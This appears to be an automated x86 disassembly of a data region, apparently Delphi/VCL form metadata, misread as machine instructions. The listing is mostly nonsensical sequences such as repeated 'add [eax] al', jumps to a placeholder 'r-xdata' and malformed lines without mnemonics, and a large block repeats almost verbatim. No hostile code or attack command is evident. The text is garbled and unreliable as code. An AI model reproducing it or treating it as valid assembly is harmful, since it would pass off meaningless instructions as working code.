add [ ecx + eax ] ah
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
insb
dec edi
jne r-xdata
jae r-xdata
jl r-xdata
add bh bh
loopne r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
push 0x61437261
jb r-xdata
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
jmp eax
insb
dec ebx
or eax [ ebx + 0x6f ]
jb r-xdata
jb r-xdata
jae r-xdata
popad
add bh bh
insb
mov ebp 0xbd880043
inc ebx
add [ eax ] al
add [ eax ] al
add [ 0x16ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
jb r-xdata
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
add [ ebx + 0x1 ] ah
add [ eax ] al
add [ ecx ] dl
add [ ecx ] cl
inc edx
jbe r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
add [ edx ] cl
inc edx
jbe r-xdata
inc esp
sub [ edi + 0x43 ] ah
cmp al 0xaa
inc ecx
add [ eax ] dh
inc esp
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
push cs
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
je r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0xcff0001 ] ah
and eax 0x25300044
outsd
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
outsd
inc ebx
add [ eax + eax ] dh
or al 0x45
add [ edx + eax ] cl
add bh bh
mov [ edx ] bl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5865646f
insb
dec ecx
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add dh bh
adc [ eax ] al
adc [ edx ] eax
add bh bh
rcr [ edx ] 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ 0x65646948 ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc eax
jl r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
hlt
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
fadd [ ebx ]
add [ eax ] al
add [ eax + 0x1 ] al
sbb al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
fsubr [ esi + 0x680041 ]
add [ gs : eax ] dl
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ eax + ebp + 0x67 ]
inc ebx
outsb
je r-xdata
inc eax
mov esp 0xbcd00043
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
jae r-xdata
inc eax
add [ eax ] cl
add al [ eax ]
call esp
sbb al [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] eax
or [ ebp + 0x61 ] ecx
js r-xdata
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
pop ds
add [ edi ] al
dec ecx
insd
dec ebp
outsd
sar [ gs : ebx + eax * 2 ] 0x1
mov [ ecx ] al
add bh bh
mov [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
pop es
dec ecx
insd
dec esi
popad
insd
cmp al 0x10
add bh bh
sar [ ebx + eax * 2 + 0x43bcd000 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f460400
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
call [ eax + 0x10043bd ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al 0x0
outsb
je r-xdata
inc esp
add [ eax ] dh
and eax 0x44
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add eax 0x336c7443
insd
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] dl
inc eax
add [ edx ] dl
add al [ eax ]
inc [ ebx + ebx ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or cl [ edi + 0x45 ]
dec ebp
inc ebx
outsd
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] eax
add [ eax ] al
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
[ edi * 4 - 0x431bffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002b ] al
sub al [ eax ]
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
adc [ eax ] al
push cs
add al [ eax ]
call [ eax ]
sbb al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
outsd
outsb
je r-xdata
and eax 0x61500b00
adc [ eax ] al
test eax 0x3cff0001
and eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
sub [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
inc esp
add [ eax ] dl
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
push 0x6948776f
outsb
insd
inc ebx
add [ eax + 0x25 ] ch
inc esp
add al ch
jo r-xdata
inc esp
add [ eax + eax ] bh
inc [ ebx + edi * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ eax + 0x6f ] edx
adc [ eax ] al
or eax 0x88ff0002
sbb eax [ ebx ]
add [ eax ] eax
add [ eax ] al
inc [ eax ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
ja r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ es : edx ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
sub al 0x10
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08002f ] al
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002d ] al
js r-xdata
outsb
inc ebx
add ah cl
mov ebx 0xbbfc0043
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
and eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al 0x0
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
push 0xe8004425
outsb
jne r-xdata
adc [ eax ] al
0x40ff0000 0x43bd
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jb r-xdata
popad
jae r-xdata
inc eax
add [ ecx ] bl
add bh bh
clc
mov esp 0x10043
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
xor eax [ eax + eax + 0x10 ]
jb r-xdata
add [ eax ] al
add [ 0x61500b00 ] ah
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0031 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
outsb
inc ebx
push 0x65676e61
sub al 0x10
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
in al dx
mov edx 0xdc600043
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x2c656c62
adc [ ecx ] al
sbb [ edx ] al
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ eax ] cl
dec edi
add [ eax ] cl
push ebx
inc ebx
push 0xacc47261
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
pushad
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax + 0x4f070037 ] al
popad
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
jo r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0b00
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or [ edi + 0x6e ] ecx
adc [ ecx ] al
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
push es
dec edi
add [ edi ] al
dec edi
jb r-xdata
outsb
inc ebp
js r-xdata
sub al 0x10
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x241e202
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
adc [ ecx ] al
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941e1fe
add [ eax ] al
inc [ ecx ]
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
je r-xdata
dec ebx
jns r-xdata
sub al 0x10
inc ecx
add al al
add [ eax ] eax
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
inc esp
jb r-xdata
or [ ebx + 0x74 ] dl
inc ebx
add [ ebx ] al
or al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
push ebx
je r-xdata
dec edi
int3
add [ eax ] al
jmp eax
test al 0x70
inc ebx
add al ch
add [ eax ] eax
loopne r-xdata
jo r-xdata
jo r-xdata
hlt
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : ecx ] cl
dec edi
jo r-xdata
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ ecx ] al
rol [ ecx ] 0x0
jo r-xdata
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax + 0x1c00419b ] al
daa
inc ebx
add al bh
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add [ esp + 0x21ac0044 ] dl
inc esp
add [ eax - 0x52 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 + 0x1a740043 ] bl
inc ebx
insb
jae r-xdata
xor al 0x40
insb
add [ gs : eax ] eax
add [ eax - 0x43ffbcdf ] cl
xor [ eax ] eax
fdiv [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax + 0x4f0a003a ] al
outsb
dec ebx
jns r-xdata
outsd
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
add al bl
add [ eax ] al
jae r-xdata
add al bl
add [ eax ] eax
inc ebp
outsb
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0900
jno r-xdata
outsb
push ebx
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
rcl [ eax + 0x42e4 ] 0x0
add [ eax ] al
lodsb [ esi ]
in eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x65ffbd1b ] al
add [ esi ] al
jae r-xdata
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
in eax 0x42
inc esp
jb r-xdata
jae r-xdata
push ebp
arpl [ ebx + 0x18 ] bp
jb r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ ebx ] al
jo r-xdata
push ebp
outsd
arpl [ ebx + 0x60 ] bp
jb r-xdata
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ edi + esi * 8 ] cl
inc ebx
add [ esi + edi + 0x29b00041 ] bh
inc ebx
add [ eax + esi * 4 - 0x1c3fffbd ] bl
inc ebx
xor [ eax ] eax
lodsb [ esi ]
daa
inc ebx
add ah ah
inc esp
dec esi
add [ edx + 0x2c0042e5 ] bl
add al [ eax ]
add [ eax - 0x27 ] al
inc edx
add [ eax - 0x65 ] ah
add [ eax ] al
add [ ebp + 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ch 0x42
lea eax [ bx + si ]
clc
jecxz r-xdata
in eax 0x42
outsd
outsb
or al 0x73
jae r-xdata
je r-xdata
je r-xdata
inc edx
inc esp
add [ edx + eax ] ch
add [ eax ] al
inc eax
fld [ edx ]
pushad
fwait
inc edx
outsd
jb r-xdata
add [ eax ] al
add ah dh
jecxz r-xdata
outsd
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
je r-xdata
inc eax
add [ edi + 0x2ee40043 ] ch
jpe r-xdata
insb
or dh [ ebx + 0x73 ]
push esi
jb r-xdata
jb r-xdata
inc esp
outsb
je r-xdata
inc ebx
imul esp [ ebx + 0x61 ] 0x7373066c
inc edx
outsd
je r-xdata
je r-xdata
inc esp
add al bl
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc ebx
add al ah
std
inc ebx
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax + 0x38004422 ] ah
in al 0x43
add ah cl
0xf86c0043 0x43
inc ebx
add [ edx + ebx + 0x43 ] dh
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ eax - 0x68 ] ah
add al al
jecxz r-xdata
mov al 0x43
je r-xdata
inc ebx
sub_42dd62
mov esp 0x43
add [ eax - 0x80000000 ] al
adc eax [ eax ]
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0xc586564
inc ebp
add [ edx + eax ] cl
add bh bh
mov [ edx ] bl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
or eax [ ebx + 0x6f ]
jb r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
outsd
je r-xdata
adc [ eax ] al
adc [ edx ] eax
add bh bh
rcr [ edx ] 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ 0x65646948 ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc eax
jl r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0xcff0001 ] ah
and eax 0x25300044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
hlt
inc eax
add [ eax ] cl
add al [ eax ]
call esp
sbb al [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] eax
or [ ebp + 0x61 ] ecx
js r-xdata
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
pop ds
add [ edi ] al
dec ecx
insd
dec ebp
outsd
sar [ gs : ebx + eax * 2 ] 0x1
mov [ ecx ] al
add bh bh
mov [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
pop es
dec ecx
insd
dec esi
popad
insd
cmp al 0x10
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
fadd [ ebx ]
add [ eax ] al
add [ eax + 0x1 ] al
sbb al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
fsubr [ esi + 0x680041 ]
add [ gs : eax ] dl
xor eax [ eax + ebp + 0x67 ]
inc ebx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
call [ eax + 0x10043bd ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al 0x0
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] dl
inc eax
add [ edx ] dl
add al [ eax ]
inc [ ebx + ebx ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or cl [ edi + 0x45 ]
dec ebp
inc ebx
outsd
outsb
jbe r-xdata
outsb
je r-xdata
inc eax
mov esp 0xbcd00043
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] eax
add [ eax ] al
jb r-xdata
add bh bh
sar [ ebx + eax * 2 + 0x43bcd000 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f460400
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
[ edi * 4 - 0x431bffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002b ] al
sub al [ eax ]
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
adc [ eax ] al
push cs
add al [ eax ]
call [ eax ]
sbb al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
outsd
outsb
je r-xdata
and eax 0x61500b00
adc [ eax ] al
test eax 0x3cff0001
and eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
sub [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
inc esp
add [ eax ] dl
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
add [ edx ] bh
add bh bh
jpe r-xdata
inc esp
add [ eax ] dh
and eax 0x44
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add eax 0x336c7443
inc esp
sub [ edi + 0x43 ] ah
insd
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push 0x6948776f
outsb
insd
inc ebx
add [ eax + 0x25 ] ch
inc esp
add al ch
jo r-xdata
inc esp
add [ eax + eax ] bh
inc [ ebx + edi * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ eax + 0x6f ] edx
adc [ eax ] al
or eax 0x88ff0002
sbb eax [ ebx ]
add [ eax ] eax
add [ eax ] al
inc [ eax ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
ja r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ es : edx ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
sub al 0x10
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08002f ] al
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002d ] al
js r-xdata
outsb
inc ebx
add ah cl
mov ebx 0xbbfc0043
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
and eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al 0x0
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
push 0xe8004425
outsb
jne r-xdata
adc [ eax ] al
0x40ff0000 0x43bd
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jb r-xdata
popad
jae r-xdata
inc eax
add [ ecx ] bl
add bh bh
clc
mov esp 0x10043
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
xor eax [ eax + eax + 0x10 ]
jb r-xdata
add [ eax ] al
add [ 0x61500b00 ] ah
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0031 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
outsb
inc ebx
push 0x65676e61
sub al 0x10
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
in al dx
mov edx 0xdc600043
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x2c656c62
adc [ ecx ] al
sbb [ edx ] al
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ eax ] cl
dec edi
add [ eax ] cl
push ebx
inc ebx
push 0xacc47261
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
pushad
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax + 0x4f070037 ] al
popad
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
jo r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0b00
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or [ edi + 0x6e ] ecx
adc [ ecx ] al
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
push es
dec edi
add [ edi ] al
dec edi
jb r-xdata
outsb
inc ebp
js r-xdata
sub al 0x10
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x241e202
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
adc [ ecx ] al
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941e1fe
add [ eax ] al
inc [ ecx ]
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
je r-xdata
dec ebx
jns r-xdata
sub al 0x10
inc ecx
add al al
add [ eax ] eax
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
inc esp
jb r-xdata
or [ ebx + 0x74 ] dl
inc ebx
add [ ebx ] al
or al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
push ebx
je r-xdata
dec edi
int3
add [ eax ] al
jmp eax
test al 0x70
inc ebx
add al ch
add [ eax ] eax
loopne r-xdata
jo r-xdata
jo r-xdata
hlt
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : ecx ] cl
dec edi
jo r-xdata
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ ecx ] al
rol [ ecx ] 0x0
jo r-xdata
inc ecx
add [ eax - 0x68 ] bl
